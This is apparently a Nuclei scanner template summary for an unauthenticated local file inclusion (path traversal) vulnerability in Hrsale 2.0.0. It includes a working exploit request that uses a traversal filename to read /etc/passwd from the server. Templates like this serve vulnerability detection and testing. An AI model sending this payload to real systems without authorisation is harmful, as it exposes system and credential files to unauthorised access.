# Nuclei Template: Hrsale 2.0.0 - Local File Inclusion
**Template ID:** hrsale-unauthenticated-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hrsale-unauthenticated-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from server without permission and login session

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/48920
